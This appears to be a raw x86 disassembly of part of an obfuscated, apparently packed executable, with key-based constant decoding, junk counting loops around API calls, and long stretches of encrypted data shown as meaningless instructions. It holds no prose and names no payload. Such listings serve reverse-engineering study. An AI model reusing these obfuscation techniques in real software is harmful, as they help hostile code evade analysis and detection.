  40dfd0:	mov    ecx,DWORD PTR [ebp-0x8]
  40dfd3:	mov    DWORD PTR [ebp+0xc],ecx
  40dfd6:	mov    ecx,DWORD PTR [ebp+0xc]
  40dfd9:	xor    ecx,esi
  40dfdb:	add    ecx,edi
  40dfdd:	mov    DWORD PTR [ebp+0xc],ecx
  40dfe0:	mov    ecx,DWORD PTR ds:0x41b028
  40dfe6:	mov    ecx,DWORD PTR [ecx]
  40dfe8:	mov    DWORD PTR [ebp+0xc],ecx
  40dfeb:	mov    ecx,DWORD PTR ds:0x41b230
  40dff1:	mov    ecx,DWORD PTR [ecx]
  40dff3:	mov    DWORD PTR [ebp-0x14],ecx
  40dff6:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  40dffd:	mov    ecx,DWORD PTR [ebp+0x10]
  40e000:	xor    ecx,esi
  40e002:	add    ecx,edi
  40e004:	mov    DWORD PTR [ebp+0x10],ecx
  40e007:	mov    ecx,DWORD PTR ds:0x41b1a8
  40e00d:	mov    DWORD PTR [ebp+0x10],ecx
  40e010:	mov    ecx,DWORD PTR [ebp+0xc]
  40e013:	mov    DWORD PTR [ebp+0xc],ecx
  40e016:	mov    ecx,DWORD PTR [ebp+0xc]
  40e019:	push   0x4
  40e01b:	pop    edx
  40e01c:	sub    edx,ecx
  40e01e:	add    edx,DWORD PTR [ebp-0x14]
  40e021:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40e028:	mov    DWORD PTR [ebp+0x10],edx
  40e02b:	mov    DWORD PTR [ebp-0x70],eax
  40e02e:	mov    eax,DWORD PTR [ebp+0xc]
  40e031:	mov    DWORD PTR [ebp-0x6c],eax
  40e034:	mov    eax,DWORD PTR [ebp+0x10]
  40e037:	mov    DWORD PTR [ebp-0x68],eax
  40e03a:	mov    eax,DWORD PTR [ebp-0x24]
  40e03d:	xor    eax,esi
  40e03f:	add    eax,edi
  40e041:	mov    DWORD PTR [ebp-0x64],eax
  40e044:	lea    eax,[ebp-0x2c]
  40e047:	mov    DWORD PTR [ebp-0x60],eax
  40e04a:	mov    eax,DWORD PTR [ebp-0x70]
  40e04d:	xor    eax,esi
  40e04f:	add    eax,edi
  40e051:	mov    DWORD PTR [ebp-0x70],eax
  40e054:	lea    eax,[ebp-0x70]
  40e057:	push   eax
  40e058:	mov    eax,DWORD PTR [ebp-0xc]
  40e05b:	xor    eax,esi
  40e05d:	add    eax,edi
  40e05f:	push   eax
  40e060:	mov    eax,ds:0x41b1c8
  40e065:	push   0x41b11e
  40e06a:	push   DWORD PTR [eax]
  40e06c:	call   0x4120bb
  40e071:	xor    esi,esi
  40e073:	mov    eax,DWORD PTR [ebp+0x10]
  40e076:	sub    eax,esi
  40e078:	push   eax
  40e079:	mov    eax,DWORD PTR [ebp+0xc]
  40e07c:	add    eax,esi
  40e07e:	push   eax
  40e07f:	call   0x4099c9
  40e084:	inc    esi
  40e085:	cmp    esi,0x52
  40e088:	jb     0x40e073
  40e08e:	mov    eax,DWORD PTR [ebp-0xc]
  40e091:	call   0x406acb
  40e096:	lea    eax,[ebp+0x4]
  40e099:	mov    DWORD PTR [ebp-0x28],eax
  40e09c:	mov    eax,DWORD PTR [ebp-0x10]
  40e09f:	mov    eax,DWORD PTR [ebp-0x4]
  40e0a2:	push   DWORD PTR [ebp-0x8]
  40e0a5:	lea    eax,[ebp-0x28]
  40e0a8:	push   eax
  40e0a9:	call   0x410b90
  40e0ae:	mov    eax,ds:0x41b1a8
  40e0b3:	push   0x4
  40e0b5:	add    eax,0x1cc
  40e0ba:	push   eax
  40e0bb:	lea    eax,[ebp-0x10]
  40e0be:	push   eax
  40e0bf:	call   0x402976
  40e0c4:	mov    eax,DWORD PTR [ebp-0x10]
  40e0c7:	mov    eax,DWORD PTR [eax]
  40e0c9:	pop    edi
  40e0ca:	pop    esi
  40e0cb:	pop    ebx
  40e0cc:	leave  
  40e0cd:	ret    0xc
  40e0d0:	push   ebp
  40e0d1:	mov    ebp,esp
  40e0d3:	sub    esp,0x24
  40e0d6:	mov    eax,ds:0x41b1a8
  40e0db:	mov    eax,DWORD PTR [eax+0x198]
  40e0e1:	mov    DWORD PTR [ebp-0x8],eax
  40e0e4:	adc    ecx,eax
  40e0e6:	mov    eax,DWORD PTR [ebp+0x8]
  40e0e9:	mov    ecx,DWORD PTR [ebp-0x8]
  40e0ec:	xor    DWORD PTR ds:0x42fd69,0x42fd55
  40e0f6:	push   ebx
  40e0f7:	push   esi
  40e0f8:	mov    esi,0x7510855
  40e0fd:	xor    eax,esi
  40e0ff:	not    ebx
  40e101:	push   edi
  40e102:	mov    edi,0x32729c
  40e107:	add    eax,edi
  40e109:	sbb    ebx,DWORD PTR ds:0x42fd69
  40e10f:	jmp    0x40e279
  40e114:	sub    dl,0xce
  40e117:	gs push 0x61
  40e11a:	mov    bh,0xf1
  40e11c:	fstp   DWORD PTR [ecx-0x1a5d2fbc]
  40e122:	ret    0x685b
  40e125:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e126:	jo     0x40e198
  40e128:	ret    
  40e129:	jg     0x40e19b
  40e12b:	jo     0x40e10a
  40e12d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e12e:	and    cl,BYTE PTR [ebx-0x17]
  40e131:	loopne 0x40e13d
  40e133:	enter  0x5a44,0xa0
  40e137:	jl     0x40e1ad
  40e139:	lahf   
  40e13a:	mov    bl,ch
  40e13c:	lahf   
  40e13d:	clc    
  40e13e:	jo     0x40e13c
  40e140:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e141:	neg    BYTE PTR [edx+0x7b]
  40e144:	scas   al,BYTE PTR es:[edi]
  40e145:	xchg   BYTE PTR [esi-0x2a154882],bl
  40e14b:	ja     0x40e0f3
  40e14d:	push   ebp
  40e14e:	mov    al,bh
  40e150:	test   eax,0x200201e2
  40e155:	jne    0x40e163
  40e157:	jns    0x40e0dc
  40e159:	pop    esp
  40e15a:	dec    eax
  40e15b:	das    
  40e15c:	and    cl,BYTE PTR ds:0x2ae5cddd
  40e162:	cwde   
  40e163:	rcl    esp,0x2e
  40e166:	(bad)  
  40e167:	out    0x7d,al
  40e169:	data16 scas al,BYTE PTR es:[edi]
  40e16b:	fs jb  0x40e19c
  40e16e:	inc    esp
  40e16f:	test   al,0xf2
  40e171:	add    BYTE PTR [edi-0x2],0x81
  40e175:	mov    edi,0x20a180f2
  40e17a:	add    BYTE PTR [edi+0x5f],al
  40e17d:	gs inc eax
  40e17f:	repnz pop ds
  40e181:	push   ebx
  40e182:	imul   esi,DWORD PTR [eax-0x59a1632d],0xfffffff3
  40e189:	push   edx
  40e18a:	ins    BYTE PTR es:[edi],dx
  40e18b:	cwde   
  40e18c:	out    0xe6,eax
  40e18e:	add    BYTE PTR [edx],dh
  40e190:	lds    ebp,FWORD PTR [ebx+0x3fa28386]
  40e196:	inc    ecx
  40e197:	push   esi
  40e198:	mov    DWORD PTR [eax-0x51],ebx
  40e19b:	ss or  al,bl
  40e19e:	xchg   ecx,eax
  40e19f:	jmp    0x40e1e8
  40e1a1:	scas   al,BYTE PTR es:[edi]
  40e1a2:	adc    bl,dl
  40e1a4:	push   esi
  40e1a5:	mov    dl,0xef
  40e1a7:	fadd   QWORD PTR [ecx+0x16]
  40e1aa:	pop    eax
  40e1ab:	jp     0x40e188
  40e1ad:	xchg   ecx,eax
  40e1ae:	jae    0x40e1c0
  40e1b0:	ins    DWORD PTR es:[edi],dx
  40e1b1:	dec    esp
  40e1b2:	pop    ecx
  40e1b3:	inc    edx
  40e1b4:	xchg   esp,eax
  40e1b5:	in     al,0x55
  40e1b7:	cmp    al,0x8f
  40e1b9:	sub    eax,0x8d41e6f7
  40e1be:	xor    DWORD PTR [edx+esi*1],ebx
  40e1c1:	adc    eax,0x668a9cbc
  40e1c6:	out    dx,eax
  40e1c7:	sub    al,0xe3
  40e1c9:	es dec edi
  40e1cb:	push   0x488c1c02
  40e1d0:	mov    edi,0x13c0ccb7
  40e1d5:	daa    
  40e1d6:	push   esp
  40e1d7:	mov    eax,DWORD PTR [ebp+0x42f5a8ca]
  40e1dd:	call   0x72c1d4f1
  40e1e2:	push   es
  40e1e3:	sub    ebx,ecx
  40e1e5:	ficom  DWORD PTR [ecx-0x18]
  40e1e8:	mov    BYTE PTR [edi],al
  40e1ea:	pusha  
  40e1eb:	aam    0xfb
  40e1ed:	or     al,0x6b
  40e1ef:	or     eax,0x26d04af1
  40e1f4:	and    DWORD PTR [ebp-0x76dc4a58],edi
  40e1fa:	jge    0x40e271
  40e1fc:	fldcw  WORD PTR [edx+0x7c]
  40e1ff:	mov    ebx,0xa097388a
  40e204:	push   esp
  40e205:	mov    dl,0xa0
  40e207:	ja     0x40e18a
  40e209:	push   0xffffff8c
  40e20b:	std    
  40e20c:	adc    eax,0x36be48cd
  40e211:	sbb    esp,DWORD PTR [edi]
  40e213:	jno    0x40e25e
  40e215:	bound  edi,QWORD PTR [edx-0x379e5e3b]
  40e21b:	es push es
  40e21d:	jmp    0x3c2cdecd
  40e222:	ja     0x40e269
  40e224:	jg     0x40e255
  40e226:	fidivr DWORD PTR [eax+0x5c]
  40e229:	mov    dh,0x76
  40e22b:	int3   
  40e22c:	jecxz  0x40e27e
  40e22e:	addr16 push eax
  40e230:	in     al,dx
  40e231:	(bad)  
  40e233:	loop   0x40e1f9
  40e235:	mov    DWORD PTR [ebx],ebx
  40e237:	fmul   QWORD PTR [ecx]
  40e239:	jns    0x40e2ad
  40e23b:	(bad)  
  40e23c:	mov    ds:0x3731dee8,al
  40e241:	out    0x2,eax
  40e243:	mov    cl,0xfe
  40e245:	dec    ebx
  40e246:	in     eax,0x61
  40e248:	ins    BYTE PTR es:[edi],dx
  40e249:	mov    ebp,0x912a016f
  40e24e:	jae    0x40e290
  40e250:	out    0xd8,al
  40e252:	push   0xffffff94
  40e254:	jae    0x40e1df
  40e256:	(bad)  
  40e257:	(bad)  
  40e258:	js     0x40e28a
  40e25a:	int3   
  40e25b:	sub    dl,ch
  40e25d:	dec    BYTE PTR [ecx+0x79807b7a]
  40e263:	jp     0x40e2cb
  40e265:	and    esp,ecx
  40e267:	cmc    
  40e268:	lock mov eax,0x634e186e
  40e26e:	call   0xda937c42
  40e273:	mov    edi,0xd9b7941f
  40e278:	mov    eax,0x458d0189
  40e27d:	cld    
  40e27e:	and    DWORD PTR ds:0x42fd7d,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e295:	cmp    DWORD PTR ds:0x42fd7d,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e5e3
  40e2b0:	cmp    DWORD PTR ds:0x42fd7d,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fd7d,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fdee,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fdee
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fdee,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fdee,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fdee,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd81
  40e315:	call   DWORD PTR ds:0x42e4f7
  40e31b:	cmp    DWORD PTR ds:0x42fdee,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fdee
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fdee,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e814
  40e340:	mov    ecx,DWORD PTR ds:0x42e81c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fdf2,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	push   ss
  40e377:	pop    ebx
  40e378:	fnsave [edi]
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e34f
  40e383:	hlt    
  40e384:	or     al,0x33
  40e386:	jge    0x40e39e
  40e388:	or     al,BYTE PTR [ecx-0x3f]
  40e38b:	mov    esi,0xec01f7a0
  40e390:	push   ebx
  40e391:	cmp    ecx,DWORD PTR [edx]
  40e393:	call   0x9e221bf1
  40e398:	pop    es
  40e399:	rcr    BYTE PTR [ecx-0x7b],cl
  40e39c:	in     al,dx
  40e39d:	jge    0x40e3e9
  40e39f:	inc    ebx
  40e3a0:	ja     0x40e3e1
  40e3a2:	mov    al,0x7f
  40e3a4:	mov    eax,ds:0x59bfa9de
  40e3a9:	xchg   DWORD PTR [edx],esp
  40e3ab:	sar    BYTE PTR [ebp-0x6ebcf85c],0x81
  40e3b2:	jmp    0xed830a4e
  40e3b7:	mov    ebx,0xf6f6d220
  40e3bc:	das    
  40e3bd:	inc    ecx
  40e3be:	cmc    
  40e3bf:	mov    ebx,ss
  40e3c1:	addr16 pop edi
  40e3c3:	repnz test DWORD PTR [eax-0x2a],0x588e7f94
  40e3cb:	adc    eax,0xfe90f90c
  40e3d0:	lock xchg edi,eax
  40e3d2:	pop    ebp
  40e3d3:	push   ss
  40e3d4:	ins    DWORD PTR es:[edi],dx
  40e3d5:	aas    
  40e3d6:	leave  
  40e3d7:	mov    ds:0xc86099d3,al
  40e3dc:	pop    ds
  40e3dd:	xchg   esi,eax
  40e3de:	or     dh,ah
  40e3e0:	jb     0x40e45b
  40e3e2:	add    eax,0x30bd5f16
  40e3e7:	xor    DWORD PTR [ecx],eax
  40e3e9:	fsub   DWORD PTR [ebp-0x57]
  40e3ec:	clc    
  40e3ed:	and    BYTE PTR [ecx],al
  40e3ef:	dec    ebp
  40e3f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f1:	popa   
  40e3f2:	push   ebp
  40e3f3:	sub    DWORD PTR [ecx-0x25],edi
  40e3f6:	xchg   esi,eax
  40e3f7:	cmp    cl,BYTE PTR [ecx]
  40e3f9:	mov    cl,0xde
  40e3fb:	std    
  40e3fc:	retf   0x9f7e
  40e3ff:	jne    0x40e443
  40e401:	out    0xd6,al
  40e403:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e404:	or     ebp,DWORD PTR [ebx+0x5f]
  40e407:	inc    edi
  40e408:	push   edi
  40e409:	imul   esp,DWORD PTR [ecx+0x32],0x6a
  40e40d:	das    
  40e40e:	add    al,0x9c
  40e410:	mov    ds:0xe5ef2d6f,al
  40e415:	loopne 0x40e3ec
  40e417:	pop    ecx
  40e418:	inc    esi
  40e419:	out    dx,al
  40e41a:	jne    0x40e478
  40e41c:	jge    0x40e3ff
  40e41e:	outs   dx,BYTE PTR ds:[esi]
  40e41f:	mov    bl,0xb9
  40e421:	out    0xc0,eax
  40e423:	je     0x40e452
  40e425:	fisttp QWORD PTR [esp+esi*2]
  40e428:	ror    BYTE PTR [edi],0x1
  40e42b:	pop    edx
  40e42c:	lods   eax,DWORD PTR ds:[esi]
  40e42d:	or     eax,0x2e1c696b
  40e432:	lock add DWORD PTR [edi],esi
  40e435:	cwde   
  40e436:	sub    al,0x2e
  40e438:	jmp    0x40e3cb
  40e43a:	ins    BYTE PTR es:[edi],dx
  40e43b:	jbe    0x40e412
  40e43d:	dec    esi
  40e43e:	sbb    esi,0x33
  40e441:	sub    ebp,DWORD PTR [ecx+0x3]
  40e444:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e445:	xchg   DWORD PTR [esi],edi
  40e447:	test   BYTE PTR [ebx+ebp*4+0x716dabb5],ah
  40e44e:	sub    DWORD PTR ds:0x577956da,edx
  40e454:	jno    0x40e408
  40e456:	ja     0x40e3f8
  40e458:	test   DWORD PTR [ecx+0x66],ebx
  40e45b:	in     al,dx
  40e45c:	dec    esi
  40e45d:	inc    DWORD PTR [edx-0x4a]
  40e460:	cmp    al,0x5c
  40e462:	cdq    
  40e463:	jmp    DWORD PTR [esi-0x3a73d436]
  40e469:	push   ecx
  40e46a:	or     DWORD PTR [esi-0x3d],ebp
  40e46d:	lds    esi,FWORD PTR [ecx+eiz*8-0x62]
  40e471:	pop    ecx
  40e472:	mov    ah,0x5c
  40e474:	push   ebp
  40e475:	dec    esp
  40e476:	cmp    esi,DWORD PTR [edx+esi*8+0x1a476368]
  40e47d:	push   0x40
  40e47f:	xchg   ecx,eax
  40e480:	xchg   edi,eax
  40e481:	xchg   ebx,eax
  40e482:	jo     0x40e405
  40e484:	push   ecx
  40e485:	mov    al,ds:0xcdca0777
  40e48a:	je     0x40e430
  40e48c:	sub    DWORD PTR [eax],ecx
  40e48e:	pop    ds
  40e48f:	xchg   sp,ax
  40e491:	daa    
  40e492:	imul   BYTE PTR [eax-0x50e69be9]
  40e498:	or     al,0x8c
  40e49a:	dec    esp
  40e49b:	cli    
  40e49c:	ffreep st(3)
  40e49e:	mov    esi,DWORD PTR [eax]
  40e4a0:	xchg   ebx,eax
  40e4a1:	add    edi,ecx
  40e4a3:	repnz mov eax,ds:0x29a33655
  40e4a9:	jge    0x40e455
  40e4ab:	out    0xce,al
  40e4ad:	aaa    
  40e4ae:	pop    es
  40e4af:	ret    0xe743
  40e4b2:	loop   0x40e507
  40e4b4:	fs clc 
  40e4b6:	cdq    
  40e4b7:	push   ecx
  40e4b8:	lea    esi,[edx]
  40e4ba:	imul   edi,DWORD PTR [eax-0x32],0x64414cd9
  40e4c1:	or     DWORD PTR [esi+edx*8-0x10],0x48d9880b
  40e4c9:	sub    bh,al
  40e4cb:	xor    eax,0xc7fcd024
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x57f5740f
  40e4f5:	mov    dl,0x5e
  40e4f7:	mov    fs,WORD PTR [ebx+0x7fc37070]
  40e4fd:	jo     0x40e56f
  40e4ff:	lahf   
  40e500:	ror    ah,cl
  40e502:	push   ds
  40e503:	push   ebx
  40e504:	mov    ds:0xc5f68eb7,eax
  40e509:	stos   BYTE PTR es:[edi],al
  40e50a:	pop    es
  40e50b:	mov    cl,ah
  40e50d:	hlt    
  40e50e:	add    ah,BYTE PTR [ecx+0x6b4f961e]
  40e514:	loopne 0x40e4d3
  40e516:	dec    esi
  40e517:	adc    al,0x62
  40e519:	mov    BYTE PTR [edi],dh
  40e51b:	repnz adc al,0x7f
  40e51e:	cmp    edi,edi
  40e520:	in     eax,dx
  40e521:	es jp  0x40e57a
  40e524:	cdq    
  40e525:	jno    0x40e4eb
  40e527:	not    DWORD PTR [eax+0x40]
  40e52a:	jg     0x40e51d
  40e52c:	out    dx,al
  40e52d:	(bad)  
  40e52e:	mov    bl,0x8b
  40e530:	retf   0x8b01
  40e533:	mov    al,0x1
  40e535:	shr    DWORD PTR [edx+0x773c7e7e],0xd0
  40e53c:	mov    eax,0xca9639d5
  40e541:	dec    esp
  40e542:	mov    ebp,0x98cfcef8
  40e547:	or     dh,BYTE PTR [edi]
  40e549:	out    0x5c,al
  40e54b:	inc    ebp
  40e54c:	(bad)  
  40e54d:	not    esp
  40e54f:	ret    
  40e550:	push   esp
  40e551:	outs   dx,DWORD PTR ds:[esi]
  40e552:	push   ebp
  40e553:	sub    eax,0x5df9955d
  40e558:	xchg   ecx,eax
  40e559:	idiv   DWORD PTR [edx+eax*1+0x5da89217]
  40e560:	cmp    ebp,DWORD PTR [ecx-0x1b]
  40e563:	pop    ebp
  40e564:	lahf   
  40e565:	ss and al,0x44
  40e568:	add    esp,DWORD PTR [ebp-0x38bfe630]
  40e56e:	jb     0x40e5e8
  40e570:	ins    DWORD PTR es:[edi],dx
  40e571:	push   ds
  40e572:	cmp    ebx,edx
  40e574:	and    bl,al
  40e576:	std    
  40e577:	mov    bl,0xf5
  40e579:	pushf  
  40e57a:	lock fcomp DWORD PTR [edi-0x60]
  40e57e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e57f:	jns    0x40e55e
  40e581:	mov    BYTE PTR [ebp+edi*8+0x2e0ec727],ah
  40e588:	nop
  40e589:	in     al,0x7
  40e58b:	or     eax,edi
  40e58d:	xchg   ebp,eax
  40e58e:	jbe    0x40e5f9
  40e590:	loop   0x40e571
  40e592:	jmp    0x4c3:0x7575add7
  40e599:	mov    ah,0x93
  40e59b:	mov    dh,0x1c
  40e59d:	sub    esi,DWORD PTR [edi]
  40e59f:	bound  edx,QWORD PTR [ecx]
  40e5a1:	and    BYTE PTR [esi-0x7d],cl
  40e5a4:	leave  
  40e5a5:	mov    dh,0x7f
  40e5a7:	dec    ebp
  40e5a8:	add    BYTE PTR [ebp+0x7a86369c],0x8d
  40e5af:	pop    esi
  40e5b0:	or     eax,0xc7315e43
  40e5b5:	mov    ecx,0xd855802f
  40e5ba:	jnp    0x40e548
  40e5bc:	pop    ss
  40e5bd:	mov    cl,0x8a
  40e5bf:	scas   al,BYTE PTR es:[edi]
  40e5c0:	imul   ecx
  40e5c2:	push   ebx
  40e5c3:	mov    eax,0x87bf299a
  40e5c8:	leave  
  40e5c9:	fisub  DWORD PTR [eax]
  40e5cb:	loop   0x40e5a8
  40e5cd:	je     0x40e5e0
  40e5cf:	and    edx,DWORD PTR [ebx-0x50]
  40e5d2:	or     DWORD PTR ds:[edx+0x740e357d],0xffffffef
  40e5da:	stos   BYTE PTR es:[edi],al
  40e5db:	and    bl,BYTE PTR [edx]
  40e5dd:	cmp    eax,DWORD PTR [esi+0x55]
  40e5e0:	call   0x2185:0x748f3f04
  40e5e7:	les    eax,FWORD PTR [ecx+0x6c]
  40e5ea:	push   0x7d
  40e5ec:	aam    0x3d
  40e5ee:	fdivp  st(4),st
  40e5f0:	jmp    0x4810afb7
  40e5f5:	int    0xe
  40e5f7:	fwait
  40e5f8:	mov    ebp,0x8c3c5f69
  40e5fd:	repz fnstcw WORD PTR [edx-0x3589e12f]
  40e604:	loop   0x40e5fe
  40e606:	mov    ebx,0xc7a9afe7
  40e60b:	mov    ch,0x41
  40e60d:	outs   dx,BYTE PTR ds:[esi]
  40e60e:	xchg   esp,eax
  40e60f:	aad    0x54
  40e611:	jle    0x40e612
  40e613:	ins    DWORD PTR es:[edi],dx
  40e614:	adc    esi,DWORD PTR [esi+edi*1]
  40e617:	sbb    al,0x8b
  40e619:	leave  
  40e61a:	(bad)  
  40e61c:	add    DWORD PTR [esi+0x4],ecx
  40e61f:	adc    ebx,DWORD PTR [esi+0x6f50c904]
  40e625:	pop    eax
  40e626:	mov    ch,0x86
  40e628:	je     0x40e5d4
  40e62a:	pop    esp
  40e62b:	sbb    edx,DWORD PTR [esi-0x3bd99eb8]
  40e631:	out    0xb1,eax
  40e633:	scas   al,BYTE PTR es:[edi]
  40e634:	cmp    dh,BYTE PTR [eax]
  40e636:	cmc    
  40e637:	xor    al,0xd8
  40e639:	adc    al,0xf9
  40e63b:	push   0xffffffc5
  40e63d:	fwait
  40e63e:	ss dec ebx
  40e640:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e641:	jp     0x40e696
  40e643:	out    dx,al
  40e644:	into   
  40e645:	fidiv  WORD PTR [ebx+0x2ad6425b]
  40e64b:	push   cs
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fdfa,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fdfa
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fdfa,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fdfa,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fdfa,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e4fb
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e19c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd81,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fd59,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	inc    eax
  40e6db:	lock push 0x70a251c1
  40e6e1:	jo     0x40e6a6
  40e6e3:	jg     0x40e755
  40e6e5:	jo     0x40e6c9
  40e6e7:	mov    al,ds:0xa34f7744
  40e6ec:	push   0xffffffdb
  40e6ee:	jno    0x40e76a
  40e6f0:	test   al,0xbe
  40e6f2:	call   0x6763d0b8
  40e6f7:	or     cl,BYTE PTR [eax]
  40e6f9:	cli    
  40e6fa:	dec    esp
  40e6fb:	adc    bh,bl
  40e6fd:	push   esi
  40e6fe:	xchg   ecx,eax
  40e6ff:	push   ecx
  40e700:	xor    BYTE PTR ds:0xd3bc9ff3,0xd2
  40e707:	imul   edx,DWORD PTR [edx],0x32
  40e70a:	mov    bl,0x35
  40e70c:	sub    DWORD PTR [ecx-0x2cc201c4],ebx
  40e712:	arpl   WORD PTR [eax+0x12d4bb40],cx
  40e718:	(bad)  
  40e719:	cwde   
  40e71a:	xchg   ebp,eax
  40e71b:	in     eax,0x6d
  40e71d:	pop    es
  40e71e:	das    
  40e71f:	mov    bl,al
  40e721:	fdivp  st(1),st
  40e723:	push   esp
  40e724:	stc    
  40e725:	adc    ecx,ecx
  40e727:	jecxz  0x40e7a3
  40e729:	add    eax,0x31b352fc
  40e72e:	xchg   BYTE PTR [edx-0x37],dl
  40e731:	aad    0xe3
  40e733:	dec    edx
  40e734:	ds call 0x164cdee6
  40e73a:	jle    0x40e6d6
  40e73c:	mov    al,ds:0x1dc196e8
  40e741:	daa    
  40e742:	xchg   ebx,eax
  40e743:	mov    bl,0xf
  40e745:	daa    
  40e746:	js     0x40e70f
  40e748:	push   esp
  40e749:	push   ss
  40e74a:	xchg   edi,eax
  40e74b:	in     al,0xab
  40e74d:	hlt    
  40e74e:	popa   
  40e74f:	lock add ch,BYTE PTR [edx]
  40e752:	je     0x40e741
  40e754:	sub    eax,0xe28a3cc2
  40e759:	lods   al,BYTE PTR ds:[esi]
  40e75a:	out    0x71,eax
  40e75c:	lods   eax,DWORD PTR ds:[esi]
  40e75d:	leave  
  40e75e:	in     eax,0xb2
  40e760:	jl     0x40e75f
  40e762:	jmp    0x40e72c
  40e764:	push   cs
  40e765:	rcr    DWORD PTR [edi+0x4383e8dc],cl
  40e76b:	sub    eax,0x55d83920
  40e770:	in     al,0x3f
  40e772:	mov    dh,0x2b
  40e774:	pop    ecx
  40e775:	mov    al,cl
  40e777:	repz push es
  40e779:	add    ecx,eax
  40e77b:	data16 into 
  40e77d:	dec    esp
  40e77e:	xchg   ebx,eax
  40e77f:	ror    DWORD PTR [edi],cl
  40e781:	test   DWORD PTR [edi-0x6f],eax
  40e784:	jbe    0x40e78d
  40e786:	dec    esi
  40e787:	mov    dh,0xa
  40e789:	xor    al,0x7e
  40e78b:	fwait
  40e78c:	add    eax,0x2529e522
  40e791:	fldcw  WORD PTR [ecx-0x4f]
  40e794:	dec    edx
  40e795:	rcl    esi,1
  40e797:	jl     0x40e7ee
  40e799:	lea    esi,[eax+ebp*1]
  40e79c:	adc    ebx,edi
  40e79e:	imul   edx,DWORD PTR [esi],0x38
  40e7a1:	cli    
  40e7a2:	das    
  40e7a3:	add    al,0x95
  40e7a5:	in     al,dx
  40e7a6:	xor    BYTE PTR [eax+0x42a3e958],ah
  40e7ac:	dec    ebx
  40e7ad:	test   al,0x4a
  40e7af:	mov    esi,cs
  40e7b1:	push   0xffffffaa
  40e7b3:	sar    BYTE PTR [ebx+ebx*1],0x99
  40e7b7:	bound  ebx,QWORD PTR ds:0x92c28398
  40e7bd:	and    al,0x20
  40e7bf:	sub    DWORD PTR [edi-0x18],ebx
